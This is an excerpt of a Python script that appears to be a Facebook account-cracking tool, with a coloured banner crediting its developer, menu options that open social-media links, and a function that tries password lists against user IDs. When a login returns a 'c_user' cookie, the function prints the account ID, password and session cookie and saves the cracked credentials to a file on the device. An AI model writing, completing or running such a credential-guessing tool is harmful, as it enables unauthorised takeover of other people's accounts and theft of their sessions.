...
     
                dP  `88888'  
\x1b[38;5;46m===============================================
 \033[1;31m[\033[1;32m[P]\033[1;31m]\033[1;32m DEVELOPER : MD.OSMAN GONI
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m FREE FIRE: 8002080515
 \033[1;31m[\033[1;32m[R]\033[1;31m]\033[1;32m FACEBOOK  :   
 \033[1;31m[\033[1;32m[V]\033[1;31m]\033[1;32m GITHUB    : OSMANHACKER24 
 \033[1;31m[\033[1;32m[E]\033[1;31m]\033[1;32m TOOLS     : RENDOME/FRRE
 \033[1;31m[\033[1;32m[Z]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[1]
\x1b[38;5;46m===============================================
""")
A = '\x1b[1;97m'
B = '\x1b[1;96m'
...
def Main():
        ...
        if opt in ["B","2"]:
                admin()
        if opt in ["C","3"]:
                os.system('xdg-open https://www.facebook.com/habib12h');time.sleep(1)
                fb()
        if opt in ["D","4"]:
                os.system('xdg-open https://m.me/j/Abaa6SmUROpHCTaK/');time.sleep(1)
                group()
        if opt in ["0","0"]:
                exit()
...
def admin():
        ...
        if bal =='1':
                os.system('xdg-open https://wa.me/+8801947343586');time.sleep(1)
                admin()
        if bal =='2':
                os.system('xdg-open https://www.facebook.com/habib12h/');time.sleep(1)
                admin()
        if bal =='3':
                os.system('xdg-open https://github.com/OSMANHSCKER24');time.sleep(1)
                admin()
        if bal =='0':
                Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[OSMAN]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [OSMAN-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/OSMAN-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
